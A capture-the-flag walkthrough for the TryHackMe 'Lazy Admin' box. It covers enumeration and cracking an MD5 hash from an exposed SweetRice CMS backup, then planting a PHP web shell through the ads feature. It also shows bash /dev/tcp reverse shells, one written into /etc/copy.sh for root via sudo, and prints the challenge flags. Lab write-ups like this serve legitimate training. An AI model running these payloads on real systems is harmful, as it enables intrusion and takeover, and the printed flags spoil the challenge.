# Lazy Admin – TryHackMe Writeup

## 📌 Overview

This challenge demonstrates multiple real-world web exploitation techniques including:

- Directory enumeration
- CMS exploitation (SweetRice)
- Credential discovery via backup files
- Remote Code Execution (RCE)
- Reverse shell
- Privilege escalation via misconfigured sudo

---

## 🧭 Step 1: Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV <target-ip>
```

**Discovered:**

| Port | Service |
|---|---|
| 80 | HTTP |

### 🌐 Web Enumeration

Visit:

```
http://<target-ip>/
```

Returns the default Apache page. Run a directory brute force:

```bash
gobuster dir -u http://<target-ip>/ -w common.txt
```

**Found:**

```
/content
```

---

## 🍚 Step 2: Discover SweetRice CMS

Visit:

```
http://<target-ip>/content/
```

> Identified: **SweetRice CMS**

---

## 🔐 Step 3: Find Credentials

Further enumeration reveals a MySQL backup directory:

```
/content/inc/mysql_backup
```

Download the backup file:

```
mysql_bakup_*.sql
```

Inside the file:

```php
admin: manager
passwd: 42f749ade7f9e195bf475f37a44cafcb
```

> Password is **MD5** → cracked to: `Password123`

---

## 🔑 Step 4: Login to Admin Panel

Navigate to:

```
/content/as/
```

**Credentials:**

```
Username: manager
Password: Password123
```

---

## 💣 Step 5: Remote Code Execution (RCE)

Navigate to:

```
Ads → Add new ad
```

Insert PHP payload:

```php
<?php system($_GET['cmd']); ?>
```

Trigger via browser:

```
http://<target-ip>/content/?action=ads&adname=ads1&cmd=id
```

---

## 🐚 Step 6: Get Reverse Shell

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Trigger the reverse shell:

```
cmd=bash -c "bash -i >& /dev/tcp/<your-ip>/4444 0>&1"
```

Upgrade the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## 🚩 Step 7: User Flag

```bash
cat /home/itguy/user.txt
```

```
THM{63e5bce9271952aad1113b6f1ac28a07}
```

---

## 🔺 Step 8: Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

**Found:**

```
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Inspect the script:

```bash
cat /home/itguy/backup.pl
```

```perl
system("sh", "/etc/copy.sh");
```

### 💥 Exploit

Overwrite `/etc/copy.sh` with a reverse shell:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<your-ip>/5555 0>&1"' > /etc/copy.sh
```

Start a new listener:

```bash
nc -lvnp 5555
```

Execute the perl script via sudo:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

---

## 👑 Root Access

```bash
cat /root/root.txt
```

```
THM{6637f41d0177b6f37cb20d775124699f}
```

---

## 🧠 Key Takeaways

- Backup files are a goldmine 💰
- CMS software is often vulnerable — always check the version
- File upload functionality can lead directly to RCE
- Always check `sudo -l` for privilege escalation vectors
- Scripts executed as root are a common escalation path

---

## 🎯 Conclusion

This challenge chained multiple common vulnerabilities:

1. **Information disclosure** via exposed backup files
2. **Weak credential storage** (unsalted MD5)
3. **Insecure CMS functionality** enabling code injection
4. **Misconfigured sudo** allowing privilege escalation

A great real-world simulation of a web + privilege escalation attack path.

🔥 Done.
